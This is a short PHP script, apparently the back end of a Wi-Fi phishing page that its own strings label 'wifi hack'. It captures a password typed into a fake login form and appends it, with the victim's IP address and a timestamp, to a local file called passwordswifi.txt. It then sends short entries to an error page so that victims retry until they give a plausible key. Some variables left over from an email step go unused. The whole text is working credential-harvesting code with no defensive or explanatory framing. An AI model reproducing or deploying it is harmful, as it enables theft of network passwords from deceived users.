<?php
$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message .= "----------------+ passwords +-----------------\n";
$message .= "pass: ".$_POST['pass']."\n";
$pwd = strlen($_POST['pass']);
$message .= "----------\n";
$message .= "IP: ".$ip."\n";
$message .= "Log : $time / $date \n";
$rnessage = "$message\n";
$subject = "device ip| $ip";
$headers = "alk99 wifi hack";
$file = fopen("passwordswifi.txt","ab");
fwrite($file,$message);
fclose($file);
if ( $pwd<8){  header ("location: error.html") ; exit; }
if ( $pwd>=8){ header("Location: final.html");}
?>